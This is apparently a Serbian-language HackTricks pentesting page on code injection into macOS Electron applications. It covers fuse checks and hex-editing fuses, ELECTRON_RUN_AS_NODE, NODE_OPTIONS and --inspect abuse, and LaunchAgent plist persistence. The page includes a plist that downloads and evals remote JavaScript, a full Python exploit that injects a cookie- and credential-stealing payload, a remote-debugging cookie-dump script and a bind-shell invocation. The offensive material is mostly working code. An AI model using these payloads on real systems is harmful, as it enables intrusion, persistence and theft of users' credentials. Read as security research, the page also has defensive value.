# Injection Electron aplikacija u macOS-u

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Ako ne znate šta je Electron, možete pronaći [**mnogo informacija ovde**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Za sada je dovoljno da znate da Electron pokreće **node**.\
A node ima neke **parametre** i **env varijable** koje se mogu koristiti da bi se izvršio drugi code, pored navedenog file-a.

### Electron Fuses

Ove tehnike će biti objašnjene u nastavku, ali je Electron u skorije vreme dodao nekoliko **security flag-ova kako bi ih sprečio**. To su [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), a ovo su oni koji se koriste za **sprečavanje** da Electron aplikacije u macOS-u **učitaju proizvoljan code**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Ako je onemogućen, sprečava korišćenje env varijable **`ELECTRON_RUN_AS_NODE`** za injection code-a.
- **`EnableNodeCliInspectArguments`**: Ako je onemogućen, parametri kao što su `--inspect` i `--inspect-brk` neće biti uzeti u obzir. Na ovaj način se sprečava injection code-a.
- **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućen, učitani **`asar`** **file** će biti **proveren** od strane macOS-a. Na ovaj način se **sprečava** **code injection** izmenom sadržaja ovog file-a.
- **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto pretrage i učitavanja sledećim redosledom: **`app.asar`**, **`app`** i na kraju **`default_app.asar`**, proveravaće i koristiće samo app.asar, čime se osigurava da je, kada se **kombinuje** sa fuse-om **`embeddedAsarIntegrityValidation`**, **nemoguće** **učitati code koji nije prošao proveru**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućeno, browser proces koristi file pod nazivom `browser_v8_context_snapshot.bin` za svoj V8 snapshot.

Još jedan zanimljiv fuse koji neće sprečavati code injection je:

- **EnableCookieEncryption**: Ako je omogućen, cookie store na disku se šifruje korišćenjem kriptografskih ključeva na nivou OS-a.

### Provera Electron Fuses

Ove **flag-ove** možete **proveriti** iz aplikacije pomoću:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Izmena Electron Fuses

Kao što je navedeno u [**dokumentaciji**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija za **Electron Fuses** nalazi se unutar **Electron binarnog fajla**, koji negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

U macOS aplikacijama, to se obično nalazi na putanji `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Možete učitati ovu datoteku na [https://hexed.it/](https://hexed.it/) i pretražiti prethodni string. Nakon ovog stringa možete videti u ASCII-ju broj „0“ ili „1“ koji pokazuje da li je svaki fuse onemogućen ili omogućen. Samo izmenite hex kod (`0x30` je `0`, a `0x31` je `1`) da biste **izmenili vrednosti fuse-ova**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Imajte na umu da, ako pokušate da **prepišete** binarnu datoteku **`Electron Framework`** unutar aplikacije nakon izmene ovih bajtova, aplikacija se neće pokrenuti.

## RCE dodavanjem koda u Electron Applications

Mogu postojati **spoljne JS/HTML datoteke** koje Electron App koristi, pa bi napadač mogao da ubaci kod u ove datoteke čiji potpis neće biti proveren i da izvrši proizvoljan kod u kontekstu aplikacije.

> [!CAUTION]
> Međutim, trenutno postoje 2 ograničenja:
>
> - Dozvola **`kTCCServiceSystemPolicyAppBundles`** je **potrebna** za izmenu aplikacije, pa to podrazumevano više nije moguće.
> - Kompajlirana datoteka **`asap`** obično ima fuse-ove **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** omogućene
>
> To ovaj attack path čini složenijim (ili nemogućim).

Imajte na umu da je zahtev za **`kTCCServiceSystemPolicyAppBundles`** moguće zaobići kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, izmenom **`asar`** datoteke pomoću vašeg **malicious** koda, vraćanjem naziva u **`app.app/Contents`** i njenim pokretanjem.<sup>[[5]](#references)</sup>

Kod iz asar datoteke možete raspakovati pomoću:
```bash
npx asar extract app.asar app-decomp
```
I ponovo ga zapakujte nakon što ga izmenite pomoću:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE sa ELECTRON_RUN_AS_NODE

Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ako je ova env promenljiva podešena, proces će biti pokrenut kao običan Node.js proces.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ako je fuse **`RunAsNode`** onemogućen, env var **`ELECTRON_RUN_AS_NODE`** biće ignorisana i ovo neće raditi.

### Injection iz App Plist-a

Kao što je [**ovde predloženo**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), ovu env var možete zloupotrebiti u plist-u za održavanje persistence-a:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE sa `NODE_OPTIONS`

Možete sačuvati payload u drugoj datoteci i izvršiti ga:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Ako je fuse **`EnableNodeOptionsEnvironmentVariable`** **onemogućen**, aplikacija će **ignoristati** env var **NODE_OPTIONS** prilikom pokretanja, osim ako je env var **`ELECTRON_RUN_AS_NODE`** postavljen; i on će takođe biti **ignorisan** ako je fuse **`RunAsNode`** onemogućen.
>
> Ako ne postavite **`ELECTRON_RUN_AS_NODE`**, dobićete **grešku**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injekcija iz App Plist-a

Ovu env var možete zloupotrebiti u plist-u da biste održali persistence dodavanjem sledećih ključeva:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE sa inspecting

Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako pokrenete Electron aplikaciju sa flagovima kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, biće otvoren **debug port** tako da možete da se povežete na njega (na primer iz Chrome-a na `chrome://inspect`) i moći ćete da **inject code** u nju ili čak da pokrenete nove procese.<sup>[[7]](#references)</sup>\
Na primer:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
U [**ovom blogpostu**](https://hackerone.com/reports/1274695), ovo debugovanje se zloupotrebljava da bi se headless chrome naterao da **preuzima proizvoljne fajlove na proizvoljne lokacije**.<sup>[[8]](#references)</sup>

> [!TIP]
> Ako aplikacija ima sopstveni način provere da li su env promenljive ili parametri kao što je `--inspect` podešeni, možete pokušati da ga **zaobiđete** tokom izvršavanja koristeći arg `--inspect-brk`, koji će **zaustaviti izvršavanje** na samom početku aplikacije i izvršiti bypass (na primer, prepisivanjem argumenata ili env promenljivih trenutnog procesa).

Sledeći exploit je pokazao da je, nadgledanjem i izvršavanjem aplikacije sa parametrom `--inspect-brk`, bilo moguće zaobići prilagođenu zaštitu koju je imala (prepisivanjem parametara procesa kako bi se uklonio `--inspect-brk`), a zatim ubaciti JS payload za izvlačenje cookies i kredencijala iz aplikacije:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Ako je fuse **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **ignorisati node parametre** (kao što je `--inspect`) prilikom pokretanja, osim ako je env promenljiva **`ELECTRON_RUN_AS_NODE`** postavljena, što će takođe biti **ignorisano** ako je fuse **`RunAsNode`** onemogućen.
>
> Međutim, i dalje možete koristiti **electron parametar `--remote-debugging-port=9229`**, ali prethodni payload neće funkcionisati za izvršavanje drugih procesa.

Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti određene informacije iz Electron App, kao što su **istorija** (pomoću GET komandi) ili **cookies** browsera (pošto su **decrypted** unutar browsera i postoji **json endpoint** koji će ih prikazati).

Kako to možete uraditi možete naučiti [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), kao i koristiti automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan script poput:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injekcija iz App Plist-a

Ovu env promenljivu možete zloupotrebiti u plist-u da biste održali persistence dodavanjem sledećih ključeva:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass iskorišćavanjem starijih verzija

> [!TIP]
> TCC daemon iz macOS-a ne proverava verziju aplikacije koja se izvršava. Dakle, ako **ne možete da inject-ujete code u Electron aplikaciju** nijednom od prethodnih tehnika, možete preuzeti stariju verziju APP-a i inject-ovati code u nju, jer će i dalje dobiti TCC privilegije (osim ako je Trust Cache ne spreči).

## Pokretanje koda koji nije JS

Prethodne tehnike omogućiće vam da pokrenete **JS code unutar procesa Electron aplikacije**. Međutim, imajte na umu da **child procesi rade pod istim sandbox profilom** kao parent aplikacija i **nasleđuju njene TCC dozvole**.\
Zato, ako želite da zloupotrebite entitlements za pristup kameri ili mikrofonu, na primer, možete jednostavno **pokrenuti drugi binary iz procesa**.

## Značajne Electron macOS ranjivosti (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 i različiti pre-release-ovi verzija 23-27 omogućavali su napadaču sa pravima upisivanja u folder `.app/Contents/Resources` da zaobiđe fuse-ove `embeddedAsarIntegrityValidation` **i** `onlyLoadAppFromAsar`. Greška je bila *file-type confusion* u integrity checker-u, koji je omogućavao da se učita **directory pod nazivom `app.asar`** umesto validiranog arhiva, pa se bilo koji JavaScript smešten unutar tog directory-ja izvršavao prilikom pokretanja aplikacije. Zato su i vendori koji su pratili hardening smernice i uključili oba fuse-a i dalje bili ranjivi na macOS-u.<sup>[[3]](#references)</sup>

Zakrpane Electron verzije: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** i **27.0.0-alpha.7**. Napadači koji pronađu aplikaciju sa starijom build verzijom mogu da prebrišu `Contents/Resources/app.asar` sopstvenim directory-jem i izvrše code sa TCC entitlements-ima aplikacije.<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

U januaru 2024. serija CVE-ova (CVE-2024-23738 do CVE-2024-23743) ukazala je na to da se mnoge Electron aplikacije isporučuju sa fuse-ovima **RunAsNode** i **EnableNodeCliInspectArguments** koji su i dalje uključeni. Lokalni napadač zato može ponovo da pokrene program sa environment variable-om `ELECTRON_RUN_AS_NODE=1` ili flagovima kao što je `--inspect-brk`, kako bi ga pretvorio u *generic* Node.js proces i nasledio sve sandbox i TCC dozvole aplikacije.<sup>[[4]](#references)</sup>

Iako je Electron team osporio ocenu “critical” i naveo da napadaču već treba local code-execution, problem je i dalje vredan tokom post-exploitation faze, jer pretvara bilo koji ranjivi Electron bundle u *living-off-the-land* binary koji, na primer, može da čita Contacts, Photos ili druge osetljive resurse prethodno dodeljene desktop aplikaciji.<sup>[[4]](#references)</sup>

Defensive smernice Electron maintainer-a:<sup>[[4]](#references)</sup>

* Isključite fuse-ove `RunAsNode` i `EnableNodeCliInspectArguments` u production build-ovima.
* Koristite noviji **UtilityProcess** API ako vašoj aplikaciji legitimno treba pomoćni Node.js proces, umesto da ponovo uključujete te fuse-ove.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) može se jednostavno koristiti za **pronalaženje ranjivih Electron aplikacija** koje su instalirane i inject-ovanje code-a u njih. Ovaj tool će pokušati da koristi tehniku **`--inspect`**:<sup>[[5]](#references)</sup>

Morate sami da ga compile-ujete i možete ga koristiti ovako:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki je dizajniran za backdoorovanje Electron aplikacija zamenom JavaScript fajlova aplikacija Loki Command & Control JavaScript fajlovima.

## Reference

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [MacOS Injection via Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR Integrity bypass via filetype confusion (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Statement regarding 'runAsNode' CVEs - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - A New Weapon in Your Red Teaming Armory - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Why Electron apps can't store your secrets confidentially: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging abused to download arbitrary files](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Dumping Cookies with Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging Cookie Dumping Failures with Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
